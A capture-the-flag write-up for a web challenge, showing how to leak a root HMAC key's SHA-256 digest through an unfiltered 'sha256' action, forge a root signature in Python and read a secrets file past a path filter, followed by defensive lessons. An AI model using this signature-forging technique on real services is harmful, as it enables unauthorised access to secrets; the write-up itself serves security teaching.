---
title: "Moodquery — HMAC key confusion + filter bypass"
category: Web
host: moodquery.is-course.ru
tags: [hmac, key-confusion, path-filter, root-signature]
---

# Moodquery

## API
```
POST /action?key_id=<id>&timestamp=<ts>
X-Signature: hex(HMAC_SHA256(<key_for_id>, str(ts)))
body: args=<action>&args=<path>       (repeated form fields)
```
Anonymous actions: `whoami, ps, ls, md5, sha1, sha256, mount`. `head` is filtered for `anonymous`
(absolute path, `filepath.Clean`, then a prefix denylist of `/var/run/secrets/`, `/run/secrets/`,
`/proc/`, `/dev/`).

## The bug
`root`'s key is `/run/secrets/root-key-secret`, **257 bytes**. HMAC hashes any key longer than its
64-byte block: `K' = SHA256(K)`. And `sha256` is one of the *unfiltered* actions:

```bash
args=sha256&args=/run/secrets/root-key-secret
# -> 766c213529477303d443185cdb3380fea3d53d793f5f4c840529d361b32589b2
```

So the effective HMAC key for `key_id=root` is that digest, which we can compute ourselves:

```python
key = bytes.fromhex(digest)
sig = hmac.new(key, str(ts).encode(), sha256).hexdigest()
```

Then `key_id=root` + `args=head&args=/run/secrets/flag` returns the flag, because the path filter only
applies to `anonymous`.

Flag: `YDS{…redacted…}`

## Lessons
1. A secret's *value* can leak through an unrelated, unfiltered feature (`sha256` of the key file).
2. `HMAC` key pre-hashing means the key file is only as secret as its digest.
3. Authorisation must be enforced per key_id **and per action**, not only for the "anonymous" key.
